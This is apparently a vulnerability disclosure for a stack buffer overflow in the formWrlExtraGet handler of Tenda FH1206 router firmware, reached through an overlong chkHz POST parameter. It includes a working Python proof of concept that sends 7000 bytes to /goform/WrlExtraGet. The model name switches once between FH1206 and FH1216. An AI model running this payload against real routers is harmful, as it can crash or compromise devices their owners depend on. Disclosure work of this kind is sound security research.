

# formWrlExtraGet

## Overview

- Firmware download website: https://www.tendacn.com/hk/download/detail-2344.html

## Affected version

FH1206 V1.2.0.8(8155)_EN

## Vulnerability details

There is a stack buffer overflow vulnerability in Tenda FH1216 V1.2.0.8(8155)_EN, located in the **formWrlExtraGet** function. The function receives the `chkHz` parameter from a POST request. ` strcat(v60, src);` The statement will cause a buffer overflow. The `chkHz` value provided by the user may exceed the capacity of the `v60` array, thereby triggering this security vulnerability.



![image-20240813193915831](./tenda_FH1206_buffer_overflow.assets/image-20240813193915831.png)

## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/WrlExtraGet"
payload = b"a"*7000

data = {"chkHz": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240813193640425](./tenda_FH1206_buffer_overflow.assets/image-20240813193640425.png)